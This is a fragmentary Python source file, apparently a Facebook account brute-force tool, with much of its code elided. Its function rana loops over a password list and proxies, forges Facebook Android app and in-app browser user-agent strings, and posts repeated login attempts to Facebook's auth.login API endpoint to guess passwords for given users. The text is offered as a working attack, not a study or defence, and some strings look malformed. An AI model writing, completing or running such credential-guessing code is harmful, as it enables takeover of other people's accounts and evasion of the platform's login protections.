  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
            ...
            ua = '[FBAN/FB4A;FBAV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/{density=2.0,width=720,height=1184};FBLC/sv_SE;FBCR/Telenor SE;FBMF/BullittGroupLimited;FBBD/Cat;FBPN/com.facebook.katana;FBDV/S50;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;];[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;];[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Ufone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana'
          #  print (ua)
            ...
            response = r.post('https://api.facebook.com/method/auth.login',data=data,headers=header,allow_redirects=False)
        ...
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        ua = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randrange(111, 999)}.0.0.0 Mobile Safari/537.36 [FB_IAB/EMA;FBAV/{random.randrange(111, 999)}.0.0.{random.randrange(9, 99)}.{random.randrange(111, 999)};]'
